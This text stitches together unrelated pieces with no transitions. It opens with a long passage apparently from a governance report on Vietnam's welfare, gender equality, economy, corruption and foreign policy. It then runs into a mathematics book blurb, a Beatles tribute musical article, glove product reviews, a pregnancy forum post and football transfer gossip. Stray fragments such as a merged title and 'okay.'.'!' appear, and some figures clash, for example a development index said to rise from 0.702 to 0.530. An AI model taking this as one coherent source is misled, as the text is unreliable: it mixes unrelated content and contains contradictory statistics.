A voluntary social insurance program has been part of a pilot program for more than a decade in Nghe An province. The program currently has 100,000 members. The 2006 Law of Social Insurance introduced voluntary social insurance for farmers and workers in the informal sector on 1 January 2008. However, program implementation has been very slow and limited. A large part of the labor force in rural areas is not protected, as workers lack contracts. The government has sought to address this problem with its social welfare strategy for 2011 – 2020, which envisages universal social welfare. The strategy includes six targets: increasing equality in the labor market, developing advanced social insurance, improving health care, reducing poverty, ensuring access to social services, and expanding flexible social assistance systems. Funding required for the strategy is estimated at VND 732 trillion ($38 billion), of which 50% will be state-funded.
Overall, the Vietnamese social welfare system is inefficient, and faces multiple challenges. Coverage is still limited, inequality is high (the richest group of the population receives 40% of all social welfare resources, while the poorest receives about 7%) and public expenditures for social security programs are insufficient.
Vietnam is one of the Asia-Pacific region’s leading countries in terms of gender equality. The country has long-established equal pay provisions, and offers maternity leave from four to six months on full pay. Female enrollment in tertiary education (13%) is not far from the male figure (18%). Vietnam has Asia’s highest proportion of women in politics. Women hold 27% of National Assembly seats, 42% of committee presidencies within the NA, and 12% of the country’s ministerial portfolios. However, the numbers look different in the party’s all-powerful Central Committee, on which only 23 of 186 members are female.
The country also leads Asia in moving toward equal pay. Although female earnings in Vietnam are on average only 68% of men’s earnings, this puts Vietnam well ahead of countries such as Malaysia (47%) and Japan (46%).
In 2008, women’s labor force participation rate was 74.2 % compared to 80.6 % for men – a ratio of 0.92, which is significantly higher than that of most countries with a similar income level. In 2008, Vietnam’s Gender-related Development Index (GDI) value was 0.530 (ranking the country 58th out of 169 listed countries), up from 0.702 in 2003.
However, gender inequity has not yet disappeared in Vietnam as family violence, abuse of women for prostitution, and trafficking of women are still pressing issues in the country. While Vietnam’s gender equality achievements are in part due to the country’s strong national legal and policy framework, cultural and social expectations mean that women often do not enjoy all the rights accorded them by law or policy. Furthermore, current law and policies do not adequately address some core issues, such as migration and domestic violence. Women within ethnic minority communities are particularly disadvantaged: At least one in four is illiterate; among girls aged 15 to 17, only about 60% are in school, compared with over 72% of boys; some 20% of ethnic minority women have never attended school; and ethnic minority women have much higher infant and maternal mortality rates than do their majority counterparts.
11 | Economic Performance
Since the beginning of the Doi Moi reform program in 1986, the country has gone through various growth stages. Since 1990, the Vietnamese economy has shown continual improvement. GDP has more than doubled in the last decade. In 2010, Vietnam reached a GDP per capita of $1,160, attaining middle-income status according to World Bank criteria. The annual growth rate since 2000 has averaged 7.2%, second only to China in the Asia-Pacific region. International trade and inflows of foreign direct investment – mainly into export-oriented manufacturing sectors – have been the main drivers of growth. Vietnam was ranked third among Asian nations in terms of attracting investment in the 2007 – 2010 period, behind China and India. Foreign direct investment (FDI) increased by an annual average of 16.6% between 2001 and 2008, but contracted by 13% in 2009 due to the global economic crisis. However, FDI recovered again in 2010. Growth has been driven equally by the expansion of the export sector and strong domestic investment, with private consumption playing a somewhat lesser role. Agriculture’s share of economic output has continued to shrink, from about 24.5% in 2000 to 20.9% in 2009. However, despite the very good economic performance overall, unemployment increased from 4.3% in 2008 to an estimated 6.5% in 2010.
The integration of Vietnam into the global economy has accelerated sharply in recent years. Exported goods and services represented 68.3% of GDP in 2009, compared to 34% in 1994, and are concentrated in six product groups – crude oil, textiles and garments, footwear, seafood, wood products and electronic goods – which together account for around two-thirds of total exports. Vietnam’s exports remain heavily dependent on imported equipment and intermediate goods. Indeed, the strong import demand, further boosted by lower import barriers, has outpaced exports. This traditional trade pattern is reflected in an increasing deficit with ASEAN countries China and South Korea, only partly balanced by surpluses with the European Union and the United States. The substantial merchandise trade deficit continues to be one of the two main weaknesses in the Vietnamese economy, along with high inflation. The annual trade deficit in 2010 amounted to an estimated $13.3 billion, slightly higher than the $12.9 billion deficit recorded in 2009.
The government is concerned about its growing reliance on exports. While the export sector, helped drive growth in recent years, especially after the country joined the WTO in 2007, expectations for future export growth in Vietnam have been hampered by the slow recovery of the U.S. and the EU markets from the global financial crisis.
12 | Sustainability
Vietnam faces several severe challenges related to the deterioration of the environment. Biodiversity is quickly shrinking. The amount of primeval forest coverage is also falling sharply. Vietnam has 10.3 million hectares of natural forest left, making up just 31% of its total forest area, including just 0.57 million hectares of primeval forest. Illegal exploitation of timber, forest destruction, the introduction of exotic creatures and environmental pollution that destroys habitats and the living environment of many wildlife species are to blame. Vietnam is also listed among the countries hardest hit by global climate change.
However, in recent years Vietnam has made good progress toward the achievement of the seventh Millennium Development Goal (MDG7), environmental sustainability. For example, forest coverage increased from 27.8% in 1990 to around 40% in 2010. About 83% of the rural population today has access to clean water, compared with 30% in 1990.
Vietnam’s Socioeconomic Development Plan 2006 – 2010 was designed to pave the way for the country’s achievement of middle-income country status by 2010. The plan promoted modern governance, a strengthening of the social sector and social inclusion, and better management of natural resources. Most of the projects related to the environment have been supported and financed by international donors. Funds earmarked for environmental purposes represent 11% of total official development assistance (ODA) to Vietnam, which has been between $7 and $8 billion per annum in recent years.
According to the Asian Development Bank, the Vietnamese government has demonstrated a strong commitment to the strengthening of the strategic, legislative, and institutional context for environmental protection and management. The strategic and policy framework has been enhanced through the development and adoption of a number of high-level strategies, including the National Strategy for Environmental Protection to 2010 and Vision Toward 2020, which acknowledges the links between the environment and poverty, but does not admit to tension between trade expansion and attracting more FDI on the one hand, and the environment on the other. There is a lack of any clear hierarchy and priority among the various strategies, the issues and objectives contained in documents are numerous, and the targets (where available) seem ambitious. The government currently aims at allocating 1% of the overall state budget to environmental protection activities.
Education is a prioritized sector of government spending. The percentage of state expenditure devoted to education increased from 17% in 2005 to 20% in 2010. Education is also one of the sectors where Vietnam has achieved some of the fastest and most impressive successes in terms of fulfilling the Millennium Development Goals (MDGs). The country’s literacy rate of 93% (up from 90% in 2000) is high compared with most other countries of similar income. Vietnam has achieved near universal primary education. In 2009, 97% of children went to primary school, and 88.5% of them finished five years of primary education. In this group, 90% continued to study at higher levels of education, with no major gap between urban and rural areas. The gender ratio is relatively equal, with nearly half of students at primary and secondary levels being female.
With its quantitative expansion of education, and with the goal of universal primary education reaching full attainment, qualitative improvement has become the country’s key policy challenge. The central issue for improving the quality of education in Vietnam is the effective implementation of the new curriculum introduced in 2002. Teacher education is the key to accomplishing this task. In December 2008, the government published its ambitious draft national strategy on education (version 14) for 2008 – 2020. By 2020, Vietnam hopes to provide 80% of Vietnamese youth with academic skills equivalent to a high school education. As for the quality of education, Vietnam seeks to have 60% of students meet the national requirements on reading comprehension by 2010 and 75% by 2015. Regarding higher education, the strategy envisions a 200 student per 10,000 people (1:50) ratio by 2010. However, in 2009 Vietnam’s 376 universities had places for only 400,000 of the 1.2 million candidates who sat for university entrance exams – a ratio of 1 student per 218 people. While the number of university students is increasing quickly, the national higher education infrastructure is inadequate. Currently there is no oversight system in place monitoring the quality of the rapidly increasing number of educational programs and institutions being set up to accommodate the huge demand for higher education.
R&D expenditures increased from 0.2% of GDP in 2005 to 0.7% in 2009, but remain below the global average.
Transformation Management
I. Level of Difficulty
Conditions for Vietnam’s economic transformation were difficult from the outset. At the start of the Doi Moi reform in 1986, the country was still quite isolated internationally. It was almost completely dependent on the Soviet Union for trade, and on donors for development assistance. After several decades of failed experiments with a planned economy, and having to support the high economic burden of two wars (against France and the United States), the country faced a new start in the 1980s. The lack of historical reference points made the commencement of reform even more difficult. Vietnam had no experience with the workings of a market economy, and could not initially count on the assistance of Western industrialized nations. The state’s strong position was generally a benefit, helping to ensure the successful implementation of economic reforms.
While Vietnam enjoys a high degree of political stability, endemic corruption and administrative inefficiencies that hinder policy-making could reduce the legitimacy of the VCP over time. Furthermore, the party’s attraction to Vietnam’s youth is fading. “In the past, nine out of 10 university graduates would go into the bureaucracy and want to join the party. Now, it’s the reverse. Nine out of 10 want to go into the private sector,” said Le Dang Doanh, a former government official and government advisor, in an interview cited by the Jakarta Post. Rampant corruption was the main structural obstacle to governance observed during the assessment period. The misallocation of resources resulting from an inefficient and highly corrupt administrative sector constitutes a major obstacle to efficient reform. The lack of an independent anti-corruption agency that can credibly seek out and punish corrupt officials hinders any effective enforcement of the law.
Vietnam’s physical infrastructure has markedly improved over the past decade, but remains a constraint for economic development. As a report by the American Chamber of Commerce in Vietnam explains, “Infrastructure, especially seaports and electric power, is the most important factor now for firms considering investment in Vietnam. Infrastructure constraints threaten foreign direct investment in manufacturing and exports. Private sector participation in infrastructure development, finance, and management is needed urgently, especially in electric power and deep-water seaports.”
In Vietnam, distinctions between the state, civil society, and political and nonpolitical state-sponsored organizations are blurred. There is no tradition of civil society in the Western sense. The roots of civil society in Vietnam can be found in the basic, traditional social organizational unit of the village. In the official Vietnamese understanding, today’s civil society organizations (CSO) are best described as state co-opted service providers or “an important connection between the center and the communities,” according to a recent Vietnamese study. In this interpretation, CSOs are “directed toward poverty reduction, humanitarian relief, self-organization and professional development” but not toward advocacy (however, see also Civil society participation section).
With ethnic minorities comprising between 13% and 16.5% of the population, depending on the source, Vietnam is one of the most ethnically heterogeneous societies in the Asian-Pacific region. Conflicts, as well as ethnic, religious and social differences, were mostly masked by communist ideology until only a few years ago, but have skyrocketed during the assessment period. Social and ethnic conflicts found their expression in several local protests. Since the government has embarked on a seemingly successful strategy aimed at improving the livelihoods of the ethnic minorities, it can be assumed that the concerns of civil society actors, defined in the broadest possible sense, are at least partially being taken into account. Civic protest movements are mostly limited to the local level, are spontaneously organized, and are directed against ethnic and general socioeconomic discrimination, but they have not yet been able to challenge the political regime. Demands for democracy are increasing, but they are still largely limited to uncoordinated activities on the part of individual dissidents who today lack a broader base of support. The government’s willingness to address social conflict has grown. The government does not always react to protests with violent crackdowns, at least with some groups of actors. Instead, it engages in dialogue and demonstrates interest in cooperating.
In 2009, the government was confronted by widespread elite opposition to their plans to develop a bauxite mining industry in collaboration with a Chinese company. While Vietnam had experienced opposition to development projects before, as in the case of the Son La dam, it had never faced widespread national opposition of this scope. According to Carlyle A. Thayer, for the first time the competency of the state authorities to decide on large-scale development projects was called into question by a broad national coalition of mainstream elites including environmentalists, scientists, economists, social scientists and retired officials.
II. Management Performance
14 | Steering Capability
The government is following a clear objective of long-term economic restructuring. The 11th Party Congress reaffirmed the country’s strategic goal of becoming an industrialized nation. This target has been consistent since 1991. Despite existing constraints in the implementation of its development objectives, the government has shown persistent determination in pursuing this strategic goal.
The Doi Moi program, which has been implemented consistently in many areas since 1986, speaks for the long-term character of reforms. This is evident particularly in the institutional advances made in securing private property and in opening the Vietnamese economy to international markets, which culminated in Vietnam’s accession to the WTO in January 2007. The objectives of economic transformation generally meet the country’s development needs. According to the Millennium Development Goals (MDGs) 2010 National Report for Vietnam, the country has achieved five out of eight MDGs ahead of schedule, and is likely to complete all goals by 2015. The most decisive progress has been made in poverty reduction, with a decline in the poverty rate from 58.1% in 1990 to 14.5% in 2008. The share of households lacking sufficient sustenance dropped by two-thirds from 24.9% 1993 to 6.9% in 2008. However, more than half of the ethnic minority population stills lives below the poverty line, and new forms of poverty have appeared.
Together with Ghana, Vietnam was identified in a 2010 report by the British think tank Overseas Development Institute (ODI) as a “star performer” in terms of MDG progress, particularly in terms of cutting poverty and boosting health. A study by the U.N. Economic and Social Commission for Asia and the Pacific (ESCAP) of the same year comes to similar conclusions: Vietnam has taken the lead in the Asia-Pacific region in terms of the number of MDGs carried out on schedule.
Reforms are limited to the market economy and do not include any far-reaching political liberalization. However, there has been an ongoing debate on political reform within the VCP for many years. During the assessment period, tolerance for a diversity of political views among the party cadres has grown. Some democratization from within the system is taking place, even if slowly.
Overall, the government has achieved its strategic priorities of economic development, as evidenced by the successes in poverty reduction and the achievement of middle-income status. However, not all economic reforms have been implemented effectively in all areas. In particular, long delays in establishing a level playing field for private companies and the slow privatization of state-owned enterprises have shown have highlighted implementation flaws.
The leading political actors are capable of learning from mistakes, as the modifications of legal frameworks within relatively short periods of time have proven. A flexible and adaptable political system is simply not possible under the current situation, however, and efforts to bring it about have reached their limits repeatedly as established stakeholders, including VCP cadres and the military, have defended their interests. It is also questionable whether the government has learned the lessons of the macroeconomic setbacks of 2009 and 2010, and is willing to refocus its policy priorities. The 11th Party Congress of January 2011 signaled that Vietnam was likely to continue on a path that favors rapid short-term growth and support for often uncompetitive state-owned enterprises over substantive economic reform. There has not been any strong indication that the government would be willing to sacrifice short-term growth in order to reduce the large trade and budget deficits, bring inflation under control, and reform SOEs.
15 | Resource Efficiency
According to a UNDP study, Vietnam’s administrative sector is neither large nor bloated, which contradicts popular perception. Federal employees make up only 3.5% of employees in the sector and constitute a small part of the total number of public employees when compared with other countries in the region, with smaller numbers than Japan or Indonesia. The government recognized the necessity of administrative reform early on in its reform process, though the structure and organization of the bureaucracy still present problems. Superfluous intermediary administrative levels; a lack of transparency in the decision-making process; administrative rules, regulations and procedures that frequently change without notice or reason; insufficient coordination between offices; close formal and informal ties with the VCP; and patronage all result in the waste of resources. While the government has addressed a broad range of pressing policy issues and initiated reforms through legislative means, the implementation of laws, resolutions and degrees has been slow and incomplete in most cases. This is mainly due to the lack of effective public administration reform, or of reorganization of the state bureaucracy. Overlaps and duplications of responsibilities, the lack of clear task assignments, weak prioritization, unclear leadership and decision-making structures, and often insufficient institutional and technical capacities within the administration result in the inefficient use of resources and assets.
Although Vietnam has made considerable gains in improving its macroeconomic framework conditions, it is clear that institutional and administrative structures are lagging behind. In cooperation with the UNDP, European Union and other international donors, the government has been developing an administrative reform program (Public Administrative Reform, or PAR) to support and strengthen the economic reform process. While PAR dates back to the mid-1990s, the main statement of government policy is the PAR Master Program 2001 – 2010, which was adopted in September 2001. This focused on increasing the transparency and efficiency of administrative procedures, increasing the accountability of civil servants and improving government structures. However, by 2010 this administrative reform was far from complete, and key targets had not been reached. The government’s master plan to simplify administrative procedures is also known as “Project 30,” because it aims at “a 30% reduction in compliance costs stemming from administrative procedures.” To date this remains a vision and not a goal that seems achievable in the short run.
Despite its successes, reform policy has not been universally consistent and coherent. This inconsistency has been attributable to structural constraints to policy coordination among implementing government agencies, weak monitoring and evaluation mechanisms, and the absence of incentives for good governance. In recent years, some government ministries and agencies have been merged to reduce the number of decision-making bodies; this was intended to facilitate better policy coordination and to increase the consistency and efficiency of policy-making. However, this process has been largely mechanical and has not resulted in significant coordination improvements, according to the government’s own assessment. Effective coordination mechanisms are still lacking for some cross-sector issues, including human resource development, public expenditure and environmental protection, resulting in gaps and overlaps in policy-making. Last but not least, there are few incentives serving to improve government officials’ performance. Promotions are not merit-based, and salaries continue to be very low compared to many private sector enterprises.
As Shawn W. Crispin notes, “A lack of policy coordination across state agencies and enterprises has further eroded local confidence in the government’s ability to control future inflation, and to a significant degree has undermined central efforts to contain pressures on the currency and an overheating property market” (“Vietnam as Asia’s first domino,” Asia Times online, 10 February 2010).
One of the government’s greatest challenges is fighting corruption. The VCP has intensified an anti-corruption campaign, which has included the prosecution of some allegedly corrupt, and in some cases prominent, party functionaries and government officials. However, this has seemed to be motivated in large part by the desire for good publicity, and patronage continues to be a significant problem.
In August 2006, the National Assembly passed a resolution establishing the Central Commission on Anti-Corruption, to be headed by the prime minister. In November 2008, the government unveiled a long-term national strategy for the fight against corruption (lasting until 2020). This very ambitious strategy is intended to eliminate the conditions under which corruption arises, building instead a transparent government apparatus with incorruptible civil servants. The corruption prevention plan comprises five measures: improving the transparency of authorities and agencies; completing the economic management regime; building a fair and competitive business environment; improving supervision, surveillance, investigation and prosecutions; and raising society’s awareness of its role in the fight against corruption. The government is also considering legislative measures to publicize the income of government officials. In a significant related measure aimed at creating international confidence in Vietnam’s anti-corruption roadmap, the government decided to sign the U.N. Convention Against Corruption.
The government seems willing to take on new campaigns against corruption on a regular basis. The year 2011 has proved no exception. The anti-corruption campaign featured prominently on the agenda of the 11th Party Congress. A few weeks before the congress was held, the Government Inspectorate and the World Bank launched the Vietnam Anti-Corruption Initiative (VACI) 2011, which “aims to foster innovative ideas to raise public awareness on the enforcement of laws to prevent and combat corruption.”
None of the current or previous policy approaches to corruption has included a system to protect people who witness or report on corruption. Dang Ngoc Dinh, a Vietnamese academic who studies corruption, suggests that “despite the ‘political will’ to reduce corruption, Vietnamese leaders are not interested in looking at the ‘roots,’ or why corruption continues to flourish. Often overlooked is that the call for a more intensive fight against corruption by both Vietnamese and foreign donors has not fostered potentially powerful corruption-reducing mechanisms, such as an ‘independent’ press or judiciary” (quotes in “Vietnam’s endless corruption campaign,” East West Forum, 16 April 2010).
16 | Consensus-Building
All relevant actors agree on the general direction that economic reforms should take, although their notions about the appropriate scope and speed of individual reforms vary somewhat. While conservatives are preoccupied with regime security, the reformist group within the VCP is primarily concerned with economic development and national modernization. However, given that the entire political elite has benefited greatly from ongoing economic liberalization and that the economy still grew by more than 6% in 2010, Prime Minister Dung did not face any direct challenges from the conservative quarter despite being weakened by the economic crisis. Despite widespread criticism over his economic policies and the near collapse of the state-owned company Vinashin, Dung retained his position – subject to confirmation by the National Assembly in May 2011.
Discussions on political reform within the party have taken place for many years. In recent years, tolerance for a diversity of views among party cadres has emerged. Reformers have been gaining more influence and power. This has not necessarily been visible to the public, but can be seen clearly within the bureaucratic system. Nevertheless, reforms have not aimed at advancing democratic reform in the direction of liberal democracy. Reform is about improving institutional capabilities and strengthening governance, not about democratic governance.
In Vietnamese politics, three groups can be distinguished: regime conservatives, modernizers and rent-seekers. These key blocs exist inside the ruling party and the structures of the party state, as well as within society and the economic system. Far-reaching economic reforms and modest political reforms have been spearheaded by Prime Minister Nguyen Tan Dung, who relies on a heterogeneous group of progressive members among the political elite, tied together by ideological affinity and interest convergence. The leading conservative during the assessment period was VCP General Secretary Nong Duc Manh (2001 – 2011), who was not eligible for renomination at the end of this period. However, the conservative-reformer cleavage is not identical with the generation divide in the politburo’s Central Committee, which is still the center of political power in Vietnam.
The current economic turbulence has strengthened those who are critical of reform and who have tried to exploit Dung’s difficulties in stabilizing market forces. In 2009 – 2010, criticism was primarily directed at the prime minister’s handling of the Vinashin affair and his inefficient approach to fighting inflation. At the 11th Party Congress, Nguyen Phu Trong, chairman of the National Assembly, was unveiled as the next VCP general secretary. Dung was reappointed, signaling that he is likely to carry on for a second term, though this is subject to confirmation by the National Assembly in May 2011. Both the selection of Trong and the reappointment of Dung were widely expected, and demonstrate the VCP’s preference for stability over sudden change. The political system remains opaque; conflict management happens behind closed doors. While dissent within the VCP exists, the party has to date succeeded in presenting itself as a united front vis-à-vis outside audiences.
Until recently, Vietnam’s civil society organizations (CSOs) perceived their role solely as to work in partnership with the Vietnamese government, rather than as being outside of, and independent from, the state-party system. CSOs have filled in some gaps opened up by economic reforms. Due to the limitations of state resources, problems related to the environment, education, health care, employment and basic social care can no longer be dealt with and solved by the VCP and its mass organizations alone. Social engagement helps to close these gaps. The official party line is that civil society itself should take on more responsibility. The government has dubbed this strategy socialization (xa hoi hoa). In this process, the government has shown increasing openness and willingness to engage an increasingly competent, broad and experienced spectrum of civil society actors. By and large, Vietnamese civil society acts as a service provider co-opted by the state; advocacy and lobbying roles are only gradually developing. Overall, the existing network of self-organized groups and organizations does not yet fulfill the criteria of civic autonomy, but it is a first step toward the emergence of a civil society.
17 | International Cooperation
Vietnam has been East Asia’s leading recipient of Western and Japanese overseas development assistance (ODA) in absolute terms. The total value of ODA commitments pledged between 1993 and 2009 totaled $42.5 billion. ODA commitments steadily increased from $1.8 billion in 1994 to $8.06 billion in 2010. However, total pledges for 2011 dropped slightly to $7.9 billion. There has been a disparity of 40% between commitments and actual disbursements, and Vietnam has received around 3% of its GDP in grants and concessional loans. By 2010 there were 51 donors, including 28 bilateral and 23 multilateral donors, operating regularly in Vietnam. Japan has been the largest bilateral donor (pledging $1.64 billion in 2010), followed by France, the United Kingdom and Germany. The largest multilateral donors include the World Bank, which committed $2.5 billion in 2010, followed by the Asian Development Bank ($1.48 billion) The Vietnamese government effectively utilized international assistance for its domestic policy agenda and to strengthen its reform program, particularly in the areas of poverty reduction and infrastructure improvement.
In January 2007, Vietnam joined the World Trade Organization (WTO). In October of that year, Vietnam was elected to serve as a non-permanent member of the U.N. Security Council (UNSC) for 2008 – 2009. The government encountered little opposition from other countries in the course of its campaign for a seat on the council, with Vietnam receiving 183 of 190 votes. Membership, which was regarded as one of the country’s most important diplomatic achievements to date, enabled Vietnam to gain crucial experience on the world stage. Vietnam held the presidency of the Security Council in July 2008 and October 2009, and had to deal with, inter alia, developments in several African countries, issues such as sanctions against Iran and North Korea, and the situation in Myanmar.
Since the late 1990s, the government has been making efforts to enhance ODA effectiveness. Of particular importance in this regard were Decree 17 of 2001 (on the Issuance of the Regulation on the Management and Utilization of Official Development Assistance) and the Consultative Group (CG) meetings process. The CG meetings for Vietnam bring together participants from the government of Vietnam and representatives of the bilateral and multilateral donor community. Vietnamese and international NGOs, as well as representatives of the Vietnam Business Forum, participate as observers. CG meetings provide a forum for discussions between the Vietnamese government and its development partners on economic policy issues, strategies for reducing poverty and ODA effectiveness.
The mainstream view among the country’s main bilateral and multilateral partners, as expressed in various documents, is that Vietnam’s cooperation with international donor organizations is generally trouble-free, and has resulted in considerable cooperative reform programs on issues such as fighting poverty and environmental protection. The Vietnamese government is perceived as a reliable partner overall by national governments in Europe, North America and Asia, as well as by international organizations such as the ADB and the World Bank.
However, rampant corruption (addressed regularly by Vietnam’s donors at the annual Consultative Group (CG) meetings, most recently in December 2010), macroeconomic instability and the serious financial troubles at the large state-owned firm Vinashin undermined Vietnam’s reputation as one of the most vibrant emerging economies during the assessment period.
In multilateral settings, Vietnam has been able to make a significant contribution to international organizations and cooperation programs. In January 2010, Vietnam took over the rolling ASEAN presidency for a one-year term, and chaired a number of related meetings such as ASEAN+3, the East Asia Summit and the ASEAN Regional Forum, culminating in the 17th ASEAN Summit in Hanoi at the end of the year. Vietnam’s motto for its chairmanship – “Toward the ASEAN Community: from vision to action” – indicated that it was time to implement a range of programs and agreements fully in order to make progress in establishing the ASEAN Community.
As the unofficial leader of the “CLMV” group (Cambodia, Laos, Myanmar and Vietnam), which represents the least developed of the ASEAN countries, Vietnam hosted a summit meeting of the four prime ministers in November in Hanoi. The four countries are also members of the Mekong River Commission and the Greater Mekong Subregion (GMS). Both organizations focus, inter alia, on water management and water security, issues that have recently emerged as a serious problem for Vietnam. Sino-Vietnamese relations have recovered from their diplomatic low point in the wake of the anti-China demonstrations in Hanoi and Ho Chi Minh City in December 2007, but remain troublesome with regard to conflicting sovereignty claims in the South China Sea.
Strategic Outlook
The outlook for the new CPV leadership appears relatively stable, with the transfer of political power expected to be smooth. The 11th Party Congress of January 2011 solidified the existing political system, along with its well-established structures and processes of decision-making. The new leadership elite is younger than its predecessor, but represents continuity, not change. As of the time of writing, National Assembly Chair Nguyen Phu Trong was expected to replace VCP General Secretary Nong Duc Manh, and Trong Tan Sang was expected to replace President Nguyen Minh Triet. Both Manh and Triet were over the age of 65, and retired. Prime Minister Prime Minister Nguyen Tan Dung retained his position despite criticism of his handling of Vietnam’s economic woes in 2010. Dung, Sang and Trong were all expected to take the triumvirate of power at the top of the 15-member Politburo. The National Assembly had yet to confirm the new appointments after the elections, a vote slated for May 2011.
Given that all these key figures are known as pragmatic leaders, no radical change in the country’s course is expected. Both Dung and Sang are market-oriented, and Trong publicly stated that tackling economic problems would be the first order of business. However, the new leaders have to demonstrate that they are serious about fighting inflation and corruption, and about reducing the dominance of the state-owned sector in the economy. While international confidence in the Vietnamese economy is not in serious danger, it has certainly fallen during the assessment period.
The VCP will be determined to maintain its firm grip on power, but domestic protest by pro-democracy actors and possibly even groups is likely to intensify. Vietnam’s policy-making has been increasingly influenced by inputs, including demands, from newly emerging social groups and shifting structures of influence within the state-party apparatus. Yet to the extent possible, the VCP has limited the ability of pro-democracy actors to voice alternative visions to one-party rule. In the weeks before the 11th Party Congress, Facebook – which is normally blocked with controls that are easily bypassed – was wholly inaccessible. International human rights groups also complained about crackdowns on pro-democracy dissidents in the run-up to the congress. Vietnam is still a unitary state in which a bureaucratic elite shapes policy-making. Developments nevertheless suggest that the spectrum of groups attempting to affect policy is widening, despite the effective monopoly over political discussion and policy formulation maintained by the government and the VCP. Mass protests could erupt if the government fails to bring inflation under control.
Regarding international relations, no significant change is expected. While Vietnam has been pushing for a closer relationship with the United States and Russia in order to lessen the risk of China’s growing military presence in the South China Sea, China remains a crucial partner for Vietnam in the areas of politics, economics, culture and social affairs. The new VCP General Secretary Trong is said to be close to China. With the stabilization of the country’s economy and ideological strengthening of the VCP high on the ruling elite’s agenda, further strengthening of cooperation with Hanoi’s ideological ally and economic model is likely. However, Sino-Vietnamese relations are unlikely to be completely trouble-free, and remain troublesome with regard to conflicting sovereignty claims in the South China Sea. China’s approach has become increasingly assertive; in three first months of 2010 alone, the Chinese navy captured 30 Vietnamese boats with more than 200 fishermen in disputed areas in the South China Sea.
Vietnam’s rapid integration into regional and global economic and governance structures is likely to continue, but the successes in the conduct of foreign relations cannot hide the fact that the country is still haunted by a dual international image problem, relating to the countries shortcomings in the areas of human rights and corruption.

It demonstrates the strong interconnections between the two fields and introduces recent progress of leading researchers from Asia.
In the book, W. Bergweiler discusses proper analytic maps with one critical point and generalizes a previous result concerning Leau domains. W. Cherry and J. Wang discuss non-Archimedean analogs of Picard's theorems. P.-C. Hu and C.-C. Yang give a survey of results in non-Archimedean value distribution theory related to unique range sets, the \(abc\)-conjecture, and Shiffman's conjecture. L. Keen and J. Kotus explore the dynamics of the family of \(f_\lambda(z)=\lambda\tan(z)\) and show that it has much in common with the dynamics of the familiar quadratic family \(f_c(z)=z^2+c\). R. Oudkerk discusses the interesting phenomenon known as parabolic implosion and, in particular, shows the persistence of Fatou coordinates under perturbation. Finally, M. Taniguchi discusses deformation spaces of entire functions and their combinatorial structure of singularities of the functions.
The book is intended for graduate students and research mathematicians interested in complex dynamics, function theory, and non-Archimedean function theory.

)
When Brian Epstein first saw The Beatles playing at the Cavern Club in 1961 he wasn’t overly impressed. The four members were dressed in black leather jeans and leather jackets and looked completely out of control.
“I was actually quite put off by the Beatles. They wore black leather jackets, smoked as they played and generally acted unprofessional on stage,” said Epstein. “But they gave a captivating performance and had an amazing ability to connect with the audience – especially the girls.”
So begins “In My Life,” the smash hit, musical biography of the Beatles told through the eyes of Epstein and featuring the live music of accomplished Beatles tribute, Abbey Road. Sets such as the Cavern Club are established by images projected on a large screen behind the musicians and actors. The show has been touring for five years with a critic for the Orange County Register at one point declaring, “If you see one tribute show, see this one –smart and loads of fun.” The show is widely considered by industry insiders to be the most unique Beatles show in decades.
The task of trying to write a script telling the history of the Beatles from their point of view – a glimpse inside the world of the Fab Four – was a difficult undertaking. Producers Tom Maher and Andy Nagle spent six months reading everything they could find that was written about the Beatles, but there is so much discrepancy about what actually happened behind the scenes.
“When we found the same account of facts told by several different people, we placed weight on those story lines,” said trial-lawyer-turned-music-producer Nagle. “One of the problems was that even the Beatles themselves changed their stories over time.”.
“It’s nice to learn some things about the Beatles that people may not have known, but in the end the audience really wants to hear the music,” said Maher. “So the band plays 33 Beatles hits during the show.”
The cast rehearsed Beatles music for six months and then performed Fab Four tribute concerts in clubs and bars for over a year under the name “Abbey Road” before the producers began booking the musical.
“The audience knows every vocal harmony and guitar riff,” said Maher, who was on the management team of hard rock band Guns ‘N Roses and currently manages world class bands such as Motorhead and Anthrax. “There is absolutely no room for error performing Beatles music live.”
The band features Chris Paul Overall (“Paul”), Nathaniel Bott (“John”), Jesse Wilder (“George”) and Axel Clarke (“Ringo”). Brian Epstein is played by Alxander Jon. The production includes multimedia, period costumes and vintage instruments. Cast members in their 20s and early 30s were selected to be age-appropriate for the Beatles.
The Edmonds-Woodway High School string quartet will join the band on stage for five ballads. The producers commonly hire local high school string quartets to augment the production.
You can buy tickets to the June 4 performance online at, by phone at 425-275-9595, by email to boxoffice@ec4arts.org or at the theater box office. The Edmonds Center for the Arts is located at 410 4th Ave. N.. okay.”.”!

Powder free nitrile exam gloves are extremely durable and low cost. The slight texture on the gloves helps with handling slippery ingredients out on the factory floor. These come in 4 sizes which means all employees can have a comfortable fit.

These gloves are great. They don't tear or stretch as easily as name brand gloves. Another plus is that you can choose the size that you need.
Christianne M. Posted on 09/27/2013
Good quality gloves, durable good for working with hot or cold products. Sizing note the fit of this glove is snug, be sure and verify user's hand size. The men preferred the larger over the medium. The medium size works for average female hands, thinner hands could use a small due to the fit.

These are high quality gloves, and the price is fantastic! I use these while working with dyes (non-food) and they're durable enough for me to use and reuse through an entire day's work, so that makes them an even better value. I have not yet managed to poke a fingernail through them, so I'm thrilled!

sturdy gloves, better than some that are so thin, they tear or rip easily. No powder, which I don't care for. I use them for product manufacture in my skincare business and for giving facial treatments in my spa.

I think I should see the OB and do the utrasound again. because if it happens that my last normal Menstrual period was Aug. I'm already over due and right now I felt slight contractions. I think it's normal but it keeps moving .. then if she moves I feel like I wanted to have pee pee but then I won't be able to do so and it felt to much pain. maybe she moves near in my cervix ..

So you see, the due date they gave me is rather confusing! i guess in the end it doesn't matter since it's a guideline...but boy, i'd like to know too! it's a matter of two weeks but it does count to me.posted 05/09/2012 by a BabyCenter Member

The Impact of a Decade of Investment in HIV Prevention Research in Uganda.Sport seem to be attempting to outdo themselves over the past few days with their headlines and front pages regarding Manchester United. They've had two Thiago front pages which didn't match their actual story inside and three times in the last week have said that Wayne Rooney could be likely to turn up at the Camp Nou next season. It sounds barely believable, as does the prospect of Manchester United taking David Villa as part payment.
The Catalan newspaper have escalated their claims and now say that Barcelona will send Manchester United two players, Thiago and David Villa, in exchange for Wayne Rooney. They'll also add an extra €4m, valuing Thiago at €18m, Villa at €8m and Manchester United's Wayne Rooney at €30m.
Villa is set to leave Barcelona because he's had trouble getting into the Barcelona team over the past couple of seasons and is aware the situation is only likely to get worse with the arrival of Neymar. There have been occasions when the club hasn't played a striker and that's been through choice rather than desperation, the arrival of the Brazilian wonderkid would appear to make that more likely with Messi and Neymar playing as the two main threats and perhaps accompanied by another in a fluid front three.
